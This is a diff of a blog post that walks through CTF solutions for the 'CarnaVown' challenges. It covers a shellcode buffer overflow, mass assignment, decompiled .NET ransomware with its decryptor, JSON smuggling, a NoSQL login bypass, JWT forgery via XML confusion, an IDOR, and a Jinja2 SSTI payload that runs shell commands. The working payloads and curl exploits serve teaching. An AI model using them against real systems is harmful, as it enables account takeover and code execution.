@@ -9,16 +9,17 @@ image:
 
 # Summary
 
-CarnaVown is a collection of diverse challenges ranging from web exploitation and binary pwn to mobile reversing and ransomware decryption. This post details the solutions for the following challenges:
+CarnaVown is a collection of diverse challenges ranging from web exploitation and binary pwn to mobile reversing and ransomware decryption. This post details the solutions for the following challenges, with a focus on understanding the underlying vulnerabilities and exploitation techniques.
+
 - **EzyPwn**: A classic stack-based buffer overflow with a memory leak.
 - **IdentityAPI**: A Golang structure tag misconfiguration leading to mass assignment.
 - **Inlitware**: Reversing a custom .NET ransomware to decrypt a flagged file.
 - **InstanceMetrics**: JSON smuggling due to parser inconsistencies between Go and Node.js.
 - **Pinned**: An Android challenge involving NoSQL injection and client-side restriction bypass.
 - **Vault**: XML vs JSON parsing confusion to forge an admin JWT.
-- **Marketplace**: An IDOR vulnerability leading to account takeover.
-- **Hosthub**: A Server-Side Template Injection (SSTI) vulnerability in a Python/Flask application.
-- **AsciiArt**: A classic Command Injection vulnerability in a banner creation tool.
+- **Marketplace**: An IDOR vulnerability on the user profile update endpoint.
+- **Hosthub**: Server-Side Template Injection (SSTI) in a Jinja2 application.
+- **AsciiArt**: Command Injection in a shell-executing backend.
 
 ## EzyPwn
 
@@ -27,10 +28,15 @@ CarnaVown is a collection of diverse challenges ranging from web exploitation an
 
 ### Analysis
 
-We are provided with a 64-bit ELF binary `ezynotes` and its source code. Initial checks with `checksec` reveal that `NX` (No-Execute) is disabled, meaning the stack is executable. Additionally, there is no stack canary and no PIE.
+We are provided with a 64-bit ELF binary `ezynotes` and its source code. Initial checks with `checksec` reveal the security posture of the binary:
+
+-   **NX (No-Execute) Disabled:** The stack is executable. This is the most critical finding, as it allows us to execute shellcode placed on the stack.
+-   **No Canary:** There is no stack cookie to detect buffer overflows before the return address is overwritten.
+-   **No PIE (Position Independent Executable):** The code segment is loaded at a fixed address, though the stack location will still be randomized by the OS (ASLR).
 
 ```bash
-eezypwn git:(main) ✗ checksec EzyPwn/docker/ezynotes 
+eezypwn git:(main) ✗ checksec EzyPwn/docker/ezynotes
+[*] 'ezynotes'
     Arch:       amd64-64-little
     RELRO:      Partial RELRO
     Stack:      No canary found
@@ -41,21 +47,29 @@ eezypwn git:(main) ✗ checksec EzyPwn/docker/ezynotes
     Stripped:   No
 ```
 
-The source code shows two critical vulnerabilities:
-1.  **Address Leak:** The program prints the address of the `note` buffer (`%p`), giving us a precise location on the stack.
-2.  **Buffer Overflow:** The program uses `gets(note)` to read input into a 300-byte buffer. `gets()` is inherently unsafe as it does not check input length.
+The source code reveals two critical vulnerabilities in `main()`:
 
-```c
-printf("A gift for you: %p\n", note);
-gets(note);
-```
+1.  **Address Leak:** The program prints the address of the `note` buffer (`%p`).
+    ```c
+    printf("A gift for you: %p\n", note);
+    ```
+    This leak is essential because even without PIE, the stack address is randomized at runtime. Knowing the exact address of our buffer allows us to jump to our shellcode reliably.
 
-### Exploitation
+2.  **Buffer Overflow:** The program uses `gets(note)` to read input into a 300-byte buffer.
+    ```c
+    char note[300];
+    gets(note);
+    ```
+    The `gets()` function does not check the length of the input, allowing us to write past the end of the `note` buffer and overwrite the saved return address on the stack.
 
-Since the stack is executable and we know the buffer's address, we can perform a standard shellcode injection.
-1.  **Capture the Leak:** Read the address printed by the server.
-2.  **Craft Payload:** Contains shellcode + padding + the leaked address (to overwrite RIP).
-3.  **Offset Calculation:** Disassembly of `main` shows the buffer is at `rbp-0x190` (400 bytes). To reach the return address, we need 400 bytes + 8 bytes (saved RBP) = 408 bytes.
+#### Stack Layout
+
+To exploit this, we need to understand the stack layout:
+-   **Buffer:** `note` starts at `rbp-0x190` (400 bytes from the base pointer).
+-   **Saved RBP:** 8 bytes located simply at `rbp`.
+-   **Return Address:** 8 bytes located at `rbp+8`.
+
+To control the execution flow (RIP), we need to fill the 400 bytes of the buffer + 8 bytes of the saved RBP, and then write our target address into the standard Return Address slot.
 
 ![alt text](image99.png)
 
@@ -199,46 +213,55 @@ hackingclub{REDACTED}%
 
 ### Analysis
 
-The application is a User Identity Management API written in Go. The vulnerability exists in the `User` struct definition in `models.go` and how the `RegisterHandler` in `handlers_auth.go` processes user input.
+The application is a User Identity Management API written in Go. The vulnerability is a classic case of **Mass Assignment** combined with a misunderstanding of **Go struct tags**.
 
-**Vulnerable Code in `models.go`:**
-The `IsAdmin` field uses a struct tag `json:"-,omitempty"`. This tag names the field `"-"` in JSON instead of ignoring it (which would be `json:"-"`).
+**The Vulnerability:**
+In `models.go`, the `User` struct defines the `IsAdmin` field as follows:
 
 ```go
 type User struct {
-    ID       int
-    Username string `json:"username"`
-    Email    string `json:"email"`
-    Password string `json:"password"`
+    // ...
     IsAdmin  bool   `json:"-,omitempty"`
 }
 ```
 
-**Vulnerable Code in `handlers_auth.go`:**
-The handler decodes the request body directly into the `User` struct without filtering. This allows Mass Assignment of the `IsAdmin` field if the request contains the key `"-"`.
+The developer likely intended to hide this field from JSON operations (both input and output) using the `-` tag. However, the syntax `json:"-,omitempty"` does **not** ignore the field.
+-   `json:"-"`: Field is ignored.
+-   `json:"-,"`: Field is named `"-"` in JSON.
+
+Because of the comma (used for the `omitempty` option), the Go JSON parser interprets `-` as the *name* of the key. This means the field is exposed and can be set via a JSON payload like `{"-": true}`.
+
+**The Trigger:**
+In `handlers_auth.go`, the `RegisterHandler` decodes the entire request body into the `User` struct without filtering or using a separate Data Transfer Object (DTO).
 
 ```go
 func RegisterHandler(w http.ResponseWriter, r *http.Request) {
     var user User
-
-    if err := json.NewDecoder(r.Body).Decode(&user); err != nil {
-        // ...
-    }
-    // ...
-    _, err := db.Exec(
-        "INSERT INTO users (username, email, password, is_admin) VALUES (?, ?, ?, ?)",
-        user.Username,
-        user.Email,
-        user.Password,
-        user.IsAdmin,
-    )
-    // ...
+    // VULNERABLE: Direct decoding into the persistent model
+    if err := json.NewDecoder(r.Body).Decode(&user); err != nil { ... }
+    
+    // ... Database Insert ...
 }
 ```
 
+This allows an attacker to inject the `IsAdmin` value during registration.
+
 ### Exploitation
 
-We register a new user with the payload `{"-": true}` to set `IsAdmin` to true. We then log in to receive an admin JWT and access the restricted endpoint.
+We register a new user, but instead of just sending standard fields, we include the key `"-"` set to `true`.
+
+1.  **Register Admin:**
+    ```bash
+    curl -s http://10.10.0.21:8080/api/register \
+      --json '{"username":"admin_usr","email":"admin@hack.com","password":"pw","-": true}'
+    ```
+    Result: The database inserts `is_admin = 1`.
+
+2.  **Login:**
+    Log in with the new account to retrieve a JWT. The JWT generation logic checks the database, sees `is_admin` is true, and issues an admin token.
+
+3.  **Access Flag:**
+    Use the token to access the protected `/api/admin` endpoint.
 
 ```bash
 curl -s http://10.10.0.21:8080/api/register --json '{"username":"railoca","email":"railoca@railoca.com","password":"pw","-": true}'  
@@ -261,91 +284,126 @@ curl -s http://10.10.0.21:8080/api/admin -H 'Authorization: Bearer eyJhbGciOiJIU
 
 ### Analysis
 
-This crypto-ransomware challenge provided a .NET DLL (`Inlitware.dll`) and an encrypted `flag.txt`. Decompiling the DLL with `ilspycmd` revealed the encryption logic using hardcoded seeds.
+This challenge involves a custom ransomware written in .NET. We are given the encrypted file `flag.txt` and the ransomware binary `Inlitware.dll`. The goal is to reverse the encryption process to recover the file.
 
-**Encryption Routine:**
-1.  **AES-CBC Encryption:** Key derived from MD5("6652fa25..."), IV="h3Ae6mdu/OIm5ngYKbj5Iw==".
-2.  **XOR Obfuscation:** Output XORed with Key derived from MD5("1nL1t_1s_Th3_B3st_r4nts0mw4r3").
-3.  **Base64 Encoding.**
+Decompiling the DLL (e.g., using `ilspycmd` or DNSpy) reveals the `EncryptFile` method, key generation, and the encryption pipeline.
 
-```bash
-ilspycmd Inlitware.dll
-```
+```csharp
+internal class Inlitware
+{
+    private static int Main()
+    {
+        string directoryPath = "./f4k3d1r3ct0ry-1_";
+        string[] filesFromDirectory = GetFilesFromDirectory(directoryPath);
+        foreach (string filePath in filesFromDirectory)
+        {
+            EncryptFile(filePath);
+        }
+        return 0;
+    }
 
-```c#
-<SNIP>
+    private static void EncryptFile(string filePath)
+    {
+        string key = MD5Encrypt("6652fa25-3bff-403b-9d47-33ccd4b50a11");
+        byte[] iV = Convert.FromBase64String("h3Ae6mdu/OIm5ngYKbj5Iw==");
+        string key2 = MD5Encrypt("1nL1t_1s_Th3_B3st_r4nts0mw4r3");
+        byte[] text = File.ReadAllBytes(filePath);
+        byte[] encryptedData = Encrypt(text, key, iV);
+        string s = InlitEncryptor(encryptedData, key2);
+        File.WriteAllBytes(filePath, Encoding.UTF8.GetBytes(s));
+    }
 
-	private static void EncryptFile(string filePath)
-	{
-		string key = MD5Encrypt("6652fa25-3bff-403b-9d47-33ccd4b50a11");
-		byte[] iV = Convert.FromBase64String("h3Ae6mdu/OIm5ngYKbj5Iw==");
-		string key2 = MD5Encrypt("1nL1t_1s_Th3_B3st_r4nts0mw4r3");
-		byte[] text = File.ReadAllBytes(filePath);
-		byte[] encryptedData = Encrypt(text, key, iV);
-		string s = InlitEncryptor(encryptedData, key2);
-		File.WriteAllBytes(filePath, Encoding.UTF8.GetBytes(s));
-	}
+    private static string MD5Encrypt(string text)
+    {
+        byte[] bytes = Encoding.UTF8.GetBytes(text);
+        using MD5 mD = MD5.Create();
+        byte[] array = mD.ComputeHash(bytes);
+        StringBuilder stringBuilder = new StringBuilder();
+        foreach (byte b in array)
+        {
+            stringBuilder.Append(b.ToString("x2"));
+        }
+        return stringBuilder.ToString();
+    }
 
-	private static string MD5Encrypt(string text)
-	{
-		byte[] bytes = Encoding.UTF8.GetBytes(text);
-		using MD5 mD = MD5.Create();
-		byte[] array = mD.ComputeHash(bytes);
-		StringBuilder stringBuilder = new StringBuilder();
-		byte[] array2 = array;
-		foreach (byte b in array2)
-		{
-			stringBuilder.Append(b.ToString("x2"));
-		}
-		return stringBuilder.ToString();
-	}
+    private static byte[] Encrypt(byte[] text, string key, byte[] IV)
+    {
+        byte[] bytes = Encoding.UTF8.GetBytes(key);
+        using Aes aes = Aes.Create();
+        aes.Key = bytes;
+        aes.Mode = CipherMode.CBC;
+        aes.IV = IV;
+        using ICryptoTransform cryptoTransform = aes.CreateEncryptor();
+        return cryptoTransform.TransformFinalBlock(text, 0, text.Length);
+    }
 
-	private static byte[] Encrypt(byte[] text, string key, byte[] IV)
-	{
-		byte[] bytes = Encoding.UTF8.GetBytes(key);
-		using Aes aes = Aes.Create();
-		aes.Key = bytes;
-		aes.Mode = CipherMode.CBC;
-		aes.IV = IV;
-		using ICryptoTransform cryptoTransform = aes.CreateEncryptor();
-		return cryptoTransform.TransformFinalBlock(text, 0, text.Length);
-	}
-
-	private static string InlitEncryptor(byte[] encryptedData, string key)
-	{
-		byte[] bytes = Encoding.UTF8.GetBytes(key);
-		byte[] array = new byte[encryptedData.Length];
-		for (int i = 0; i < encryptedData.Length; i++)
-		{
-			array[i] = (byte)(encryptedData[i] ^ bytes[i % bytes.Length]);
-		}
-		return Convert.ToBase64String(array);
-	}
+    private static string InlitEncryptor(byte[] encryptedData, string key)
+    {
+        byte[] bytes = Encoding.UTF8.GetBytes(key);
+        byte[] array = new byte[encryptedData.Length];
+        for (int i = 0; i < encryptedData.Length; i++)
+        {
+            array[i] = (byte)(encryptedData[i] ^ bytes[i % bytes.Length]);
+        }
+        return Convert.ToBase64String(array);
+    }
 }
 ```
 
+The analysis of the code shows:
+
+1.  **Key Generaton:**
+    -   **AES Key:** `MD5("6652fa25-3bff-403b-9d47-33ccd4b50a11")`
+    -   **XOR Key:** `MD5("1nL1t_1s_Th3_B3st_r4nts0mw4r3")`
+    -   **IV:** Base64 decoded `h3Ae6mdu/OIm5ngYKbj5Iw==`.
+
+2.  **Encryption Pipeline:**
+    Input Data -> **AES-CBC Encrypt** -> **XOR Obfuscation** -> **Base64 Encode** -> Output File.
+
+The vulnerability is that all seeds and logic are hardcoded in the binary. This is a symmetric encryption scheme where we have all the components to reverse it.
+
 ### Decryption
 
-We reverse the process: Base64 Decode -> XOR Decrypt -> AES Decrypt.
+To decrypt, we simply reverse the pipeline:
+**Input File** -> **Base64 Decode** -> **XOR Decrypt** -> **AES-CBC Decrypt** -> **Plaintext**.
+
+#### Solution Script
+We can implement the decryption in Python:
 
 ```python
 import hashlib, base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 
-def md5(t): return hashlib.md5(t.encode()).hexdigest().encode()
-def xor(d, k): return bytes([b ^ k[i % len(k)] for i, b in enumerate(d)])
+# Helper to recreate the MD5 key generation
+def md5_hex(t): 
+    return hashlib.md5(t.encode()).hexdigest().encode()
 
-aes_key = md5("6652fa25-3bff-403b-9d47-33ccd4b50a11")
-xor_key = md5("1nL1t_1s_Th3_B3st_r4nts0mw4r3")
+# Helper for the custom XOR layer
+def xor_decrypt(data, key): 
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+
+# 1. Reconstruct Keys
+aes_key_seed = "6652fa25-3bff-403b-9d47-33ccd4b50a11"
+xor_key_seed = "1nL1t_1s_Th3_B3st_r4nts0mw4r3"
+
+aes_key = md5_hex(aes_key_seed)
+xor_key = md5_hex(xor_key_seed)
 iv = base64.b64decode("h3Ae6mdu/OIm5ngYKbj5Iw==")
 
+# 2. Read Encrypted Flag
 with open('flag.txt', 'r') as f:
-    enc = base64.b64decode(f.read().strip())
+    encrypted_b64 = f.read().strip()
 
-step1 = xor(enc, xor_key)
+# 3. Reverse Pipeline
+step1_decoded = base64.b64decode(encrypted_b64)
+step2_unxored = xor_decrypt(step1_decoded, xor_key)
+
 cipher = AES.new(aes_key, AES.MODE_CBC, iv)
-print(unpad(cipher.decrypt(step1), AES.block_size).decode())
+# Unpad removes the PKCS7 padding added by AES
+plaintext = unpad(cipher.decrypt(step2_unxored), AES.block_size)
+
+print(f"Decrypted Flag: {plaintext.decode()}")
 ```
 
 ```bash
@@ -369,44 +427,26 @@ Decrypted important.txt: This file is important :)
 
 ### Analysis
 
-The challenge features a Go API Gateway protecting a Node.js Metrics Service.
+This challenge demonstrates a **JSON Smuggling** vulnerability caused by inconsistent JSON parsing between two different backend services.
 
-**Go Gateway (Port 80) (`main.go`):**
-The gateway decodes the request into a struct and validates the `Command` field against a whitelist.
+1.  **The Gatekeeper (Go):** A reverse proxy checks the request body. It unmarshals the JSON into a struct where the field is tagged as `json:"command"`. It verifies that the command is in a strict allowlist (`ps`, `df`, etc.).
+2.  **The Backend (Node.js):** If the check passes, the raw request is forwarded to a Node.js service which parses the JSON and executes the command.
 
-```go
-// main.go
-type InstanceMetricsRPC struct {
-	Command string `json:"command"`
-	Timeout int    `json:"timeout"`
-}
-// ...
-allowedCommands := map[string]bool{"ps": true, "df": true, "whoami": true, "uname": true}
-if rpc.Command == "" || !allowedCommands[rpc.Command] {
-    // Return 403
-}
-```
-
-**Node.js Backend (Port 3000) (`app.js`):**
-The backend extracts `command` and executes it.
-
-```javascript
-// app.js
-app.post('/', validateApiGatewayKey, (req, res) => {
-    const { command, timeout } = req.body;
-    // ...
-    const output = execSync(command, options).toString();
-    res.json({ output });
-});
-```
-
-The vulnerability is **JSON Smuggling** due to parser differences.
-- **Go's `encoding/json`:** Case-insensitive matchmaking. If multiple keys match (e.g., `command` and `Command`), the last one wins.
-- **Node.js's `JSON.parse`:** Distinct keys, case-sensitive. It will see both `command` and `Command`.
+**The Inconsistency:**
+-   **Go's `encoding/json`:** When unmarshalling into a struct, it is **case-insensitive** regarding key matching. If the JSON contains multiple keys that match (e.g. `command` and `Command`), it typically prefers the *last* one or exhibits specific behavior tailored to robust parsing.
+-   **Node.js `JSON.parse`:** Keys are **case-sensitive** and distinct. `command` is different from `Command`.
 
 ### Exploitation
 
-We send a JSON payload with duplicate keys: `command` (lowercase) and `Command` (capitalized).
+We can smuggle a malicious command by providing duplicate keys with different casing.
+
+**Payload:** `{"command": "cat /flag.txt", "Command": "whoami"}`
+
+**What happens:**
+1.  **Go Validation:** Go sees `Command` ("whoami"). It checks "whoami" against the whitelist. It passes.
+2.  **Forwarding:** The *entire* original JSON string is forwarded to Node.js.
+3.  **Node.js Execution:** Node.js parses the JSON. It looks specifically for the lowercase property `command` (because the code likely does `req.body.command`). It finds "cat /flag.txt".
+4.  **Result:** The code executes `cat /flag.txt` instead of the validated `whoami`.
 
 ```bash
 ➜  InstanceMetrics git:(main) ✗ curl -s 172.16.13.215/api/instance-metrics/ -H 'Content-Type: application/json' -d '{"command":"whoami"}'
@@ -433,66 +473,48 @@ Invalid or missing command
 
 ### Analysis
 
-We are given an Android APK. Reverse engineering with `jadx` reveals the following:
+We are given an Android APK. The goal is to access the `/api/admin/flag` endpoint. Reverse engineering the APK reveals several security layers we must peel back.
 
-**1. Virtual Host Routing (`RetroFitClient.java`):**
-The app adds a `Host` header to every request using an OkHttp interceptor. This tells us the server uses virtual host routing.
+1.  **Virtual Host Routing:**
+    Static analysis of `RetroFitClient.java` shows an OkHttp Interceptor adding a specific header: `Host: pinned.hc`. Without this header, the server likely returns a 404 or drops the connection.
 
-```java
-// RetroFitClient.java
-public static final Response getRetroFitInstance$lambda$0(Interceptor.Chain chain) {
-    return chain.proceed(chain.request().newBuilder().header("Host", ApiConfig.INSTANCE.getDomain()).build());
-}
-```
+2.  **Client-Side "Token" Gate:**
+    The app creates a "token" on startup (`GenerateToken.java`). This is a red herring; it's a client-side check to unlock the UI, not a server-side session token. We can ignore it or reverse the XOR logic if needed, but for the API exploitation, it's irrelevant.
 
-**2. Hidden Admin Endpoint (`ApiService.java`):**
-The API interface definition shows an admin endpoint that isn't used in the main app flow.
+3.  **User-Agent Check:**
+    Requests are blocked unless the User-Agent matches the specific OkHttp version used by the app (`okhttp/4.12.0`).
 
-```java
-// ApiService.java
-public interface ApiService {
-    @GET("api/admin/flag")
-    Call<LastLoginResponse> getFlag(@Path("flag") String flag);
-    // ...
-}
-```
-
-**3. Client-Side Token Check (`GenerateToken.java`):**
-The app asks for a token on startup, but this check is purely client-side and can be reversed or ignored for API interaction.
-
-```java
-// GenerateToken.java
-private final boolean v_chk_01(String input) {
-    if (input.length() != 27) { return false; }
-    // XOR check logic...
-    // ...
-}
-```
-
-**4. NoSQL Injection Vulnerability:**
-The `login` endpoint is vulnerable to NoSQL injection in the password field.
+4.  **NoSQL Injection (The Core Flaw):**
+    The login endpoint sends the username and password JSON directly to a backend (likely Express + MongoDB). The code does not sanitize the input.
+    
+    In MongoDB, we can pass *objects* (Query Operators) instead of strings. A common bypass is the `$gt` (greater than) operator. If we send `{"password": {"$gt": ""}}`, the database query becomes: `Find user where username="admin" AND password > ""`. Since any password is "greater than" an empty string, this bypasses the authentication.
 
 ### Exploitation
 
-We bypass the admin login by injecting a MongoDB operator (`$gt`: "") into the password field.
+We can perform this attack using `curl` without ever running the Android app.
 
-```bash
-pinned git:(main) ✗ curl 172.16.9.243/api/auth/login --json '{"username":"admin","password":{"$gt": ""}}' -H 'Host: pinned.hc' -H 'User-Agent: okhttp/4.12.0"' -i
-HTTP/1.1 200 OK
-Server: nginx/1.29.5
-Date: Wed, 18 Feb 2026 16:08:50 GMT
-Content-Type: application/json; charset=utf-8
-Content-Length: 66
-Connection: keep-alive
-X-Powered-By: Express
-Authorization: Bearer 202602181608
-ETag: W/"42-QKK1dnjJfrrzQyh04RoEdRBuv6o"
+1.  **Authenticate as Admin (Bypass):**
+    We send the NoSQL injection payload to `/api/auth/login`. We must set the correct `Host` and `User-Agent`.
+    
+    ```bash
+    curl http://172.16.9.243/api/auth/login \
+      -H 'Host: pinned.hc' \
+      -H 'User-Agent: okhttp/4.12.0' \
+      -H 'Content-Type: application/json' \
+      -d '{"username":"admin", "password":{"$gt": ""}}'
+    ```
 
-{"sucess":true,"msg":"login sucessful","lastLogin":"202602181608"}
+2.  **Retrieve Token:**
+    The server responds with success. Interestingly, the JWT is not in the JSON body but in the `Authorization` header of the response.
 
-➜  pinned git:(main) ✗ curl 172.16.9.243/api/admin/flag -H 'Authorization: Bearer 202602181608'
-{"sucess":true,"flag":"hackingclub{REDACTED}"}
-```
+3.  **Get Flag:**
+    We use the stolen admin token to call the hidden flag endpoint.
+    
+    ```bash
+    curl http://172.16.9.243/api/admin/flag \
+      -H 'Host: pinned.hc' \
+      -H 'Authorization: Bearer <TOKEN>'
+    ```
 
 **Flag:** `hackingclub{REDACTED}`
 
@@ -505,63 +527,49 @@ ETag: W/"42-QKK1dnjJfrrzQyh04RoEdRBuv6o"
 
 ### Analysis
 
-This challenge involves a Go proxy (`Vault`) and a Node.js Identity Provider (`IDP`).
+This challenge exploits a "Content-Type Confusion" between a Go Proxy and a Node.js Identity Provider (IDP).
 
-**Vault (`controllers/auth.go`):**
-The proxy unconditionally tries to unmarshal the IDP response as XML, regardless of the content type.
+1.  **Go Proxy (Vault):** The proxy forwards login requests to the IDP. Crucially, when it receives the response, it **always** attempts to parse it as XML using `xml.Unmarshal`, regardless of the actual Content-Type.
+2.  **Node.js IDP:** This service implements Content Negotiation. If we request `Accept: application/json`, it returns JSON. If we request XML, it returns XML.
 
-```go
-// controllers/auth.go
-func LoginHandler(proxy *httputil.ReverseProxy) http.HandlerFunc {
-    // ...
-    // VULNERABLE: Always unmarshals as XML
-    if err := xml.Unmarshal(rec.Body.Bytes(), &loginResp); err != nil {
-        // ...
-    }
-    // ...
-    user := models.User{
-        // ...
-        IsAdmin:     loginResp.IsAdmin,
-    }
-    token, err := auth.CreateToken(user)
-    // ...
-}
-```
+**The Mismatch:**
+Go's XML parser is extremely "lenient". If you feed it a JSON string like `{"id": "...", "desc": "<xml>..."}`, it treats the JSON syntax as garbage text and ignores it until it finds a valid opening XML tag (roughly speaking).
 
-**IDP (`app.js`):**
-The IDP respects content negotiation and can return JSON, which Go's XML parser handles leniently (skipping until it finds `<`).
-
-```javascript
-// app.js
-function sendResponse(res, data, statusCode = 200) {
-    const acceptHeader = res.req.headers.accept || '';
-    const shouldReturnJson = acceptHeader.toLowerCase().includes('application/json');
-
-    if (shouldReturnJson) {
-        res.status(statusCode).json(data);
-    } else {
-        // ... return XML
-    }
-}
-```
-
-Go's XML parser is lenient and will skip "garbage" (like JSON characters) until it finds a valid XML opening tag. By injecting XML into a field in a JSON response, we can trick Go into parsing our injected XML instead of the actual JSON structure.
+If we can insert a valid XML tag *inside* a JSON string field, Go will find it and parse it as if it were the root XML document.
 
 ### Exploitation
 
-1.  **Register:** Create a user with a malicious `description` containing the XML we want Go to parse: `<response><isAdmin>true</isAdmin></response>`.
-2.  **Login:** Request `application/json` so the IDP returns our malicious description unescaped inside a JSON string.
-3.  **Confusion:** The Go service parses the JSON response as XML, finds our injected `<isAdmin>true</isAdmin>`, and issues an Admin JWT.
+We want to forge an XML response that says `<isAdmin>true</isAdmin>`.
+
+1.  **Pollution:**
+    We register a user on the IDP. The IDP allows a `description` field. We set this field to our XML payload:
+    `description` = `<response><isAdmin>true</isAdmin></response>`
+
+2.  **The Trigger:**
+    We login, but we explicitly ask for JSON (`Accept: application/json`).
+    -   The **IDP** sees the request for JSON. It returns our user object in JSON format. Crucially, it does *not* escape the `<` and `>` characters because they are valid in JSON strings.
+    -   **Response:** `{"username": "...", "description": "<response><isAdmin>true</isAdmin></response>", "isAdmin": false}`
+
+3.  **The Confusion:**
+    The **Go Proxy** receives this JSON blob. It blindly runs `xml.Unmarshal`.
+    -   It skips the JSON `{...`.
+    -   It sees `<response>`.
+    -   It sees `<isAdmin>true</isAdmin>`.
+    -   It deserializes this into its internal struct, setting `IsAdmin = true`.
+    -   It then issues us a **Admin JWT** based on this parsed struct.
 
 ```bash
-# 1. Register with XML injection
+# 1. Register with XML injection in description
 curl -X POST http://172.16.12.177/register \
-  -d 'username=h&email=h@t.com&password=p&description=<response><isAdmin>true</isAdmin></response>'
+  -d 'username=attacker&email=att@t.com&password=p&description=<response><isAdmin>true</isAdmin></response>'
 
-# 2. Login as JSON -> Go parses XML -> Admin JWT
-token=$(curl -X POST http://172.16.12.177/login -H "Accept: application/json" -d 'email=h@t.com&password=p' | jq -r .token)
+# 2. Login asking for JSON
+# The proxy will parse our description as the authoritative XML
+token=$(curl -X POST http://172.16.12.177/login \
+  -H "Accept: application/json" \
+  -d 'email=att@t.com&password=p' | jq -r .token)
 
-# 3. Flag
+# 3. Use forged token
 curl http://172.16.12.177/admin -H "Authorization: Bearer $token"
 ```
 
@@ -593,7 +601,9 @@ curl -s http://172.16.13.204/admin -H "Authorization: Bearer $token"
 
 ### Analysis
 
-The target application allows users to update their profile information. The update endpoint `/profile/update_password.php` takes a `user_id` parameter in the POST body.
+The Marketplace application allows users to manage their profiles. Detailed inspection of the "Update Password" functionality reveals a critical flaw in how authorization is handled.
+
+When a user updates their password, the browser sends a POST request to `/profile/update_password.php`. The body of the request includes the parameters to be updated, but critically, it also includes a hidden parameter: `user_id`.
 
 ![alt text](image.png)
 
@@ -603,15 +613,17 @@ Testing reveals that the API does not verify if the `user_id` matches the curren
 
 ### Exploitation
 
-We can change the password of any user (including the admin, typically `user_id=1`) by simply modifying the `user_id` parameter in the request.
+To compromise the admin account (which typically has `user_id=1`), we simply need to replay a valid update request but change the `user_id`.
 
-1.  **Login** as a low-privileged user to get a valid session.
-2.  **Send Update Request:** Target `/profile/update_password.php` with `user_id=1` and a new password.
-3.  **Login as Admin:** Use the new credentials to access the admin account and retrieve the flag.
+1.  **Capture Traffic:** Log in as a regular user and update your profile. Capture the request in proxy.
+2.  **Modify ID:** Change `user_id` to `1` and set the `password` to something known (e.g., `pwned`).
+3.  **Execute:** Send the request. The server updates the record for User ID 1.
+4.  **Login as Admin:** Log out and log back in as `admin` (or user ID 1) with your new password to retrieve the flag.
 
 ![alt text](image-2.png)
 
 ![alt text](image-3.png)
+
 
 **Flag:** `hackingclub{REDACTED}`
 
@@ -625,7 +637,7 @@ We can change the password of any user (including the admin, typically `user_id=
 
 ### Analysis
 
-The target initially shows a web page where the only place to interact is at the `Contact Us` page.
+The Hosthub application is a simple website with a "Contact Us" form. When we submit the form, we notice that our input (e.g., the name) is reflected back to us on the confirmation page: 
 
 ![alt text](image-4.png)
 
@@ -633,9 +645,14 @@ Upon sending the request, we can see our name reflected on the page
 
 ![alt text](image-5.png)
 
-We can try for a simple `SSTI` payload to see if the backend process it and we can confirm the `SSTI` vulnerability by sending a simple `{% raw %}{{7*7}}{% endraw %}` payload
+This reflection suggests a potential **Server-Side Template Injection (SSTI)**. In modern web applications, HTML is often generated dynamically using template engines (like Jinja2 for Python, Twig for PHP, etc.). If user input is concatenated directly into the template string instead of being passed as data, the template engine may evaluate code contained within the input.
+
+To test this, we input a mathematical expression using template syntax: `{% raw %}{{ 7*7 }}{% endraw %}`.
 
 ![alt text](image-6.png)
+
+The server responds with: "Thanks for contacting us, 49!".
+The evaluation of `7*7` to `49` confirms that the server is executing our input as a Jinja2 template expression.
 
 ### Exploitation
 
@@ -643,7 +660,7 @@ We can send a simple `SSTI` payload to read the `/flag.txt` file
 
 ![alt text](image-7.png)
 
-**Payload:** `{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}{% endraw %}` 
+**Payload:** `{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}{% endraw %}`
 
 **Flag:** `hackingclub{REDACTED}`
 
@@ -652,11 +669,11 @@ We can send a simple `SSTI` payload to read the `/flag.txt` file
 ## AsciiArt
 
 **Category:** Web
-**Host:** 10.10.0.22:5000
+**Host:** `10.10.0.22:5000`
 
 ### Analysis
 
-The target introduces us to a page where we can create our Banner Art
+The "AsciiArt" application allows users to generate ASCII banners from text input. By analyzing the behavior, we suspect the backend might be using a command-line tool (like `figlet` or `toilet`) to generate this art.
 
 ![alt text](image-8.png)
 
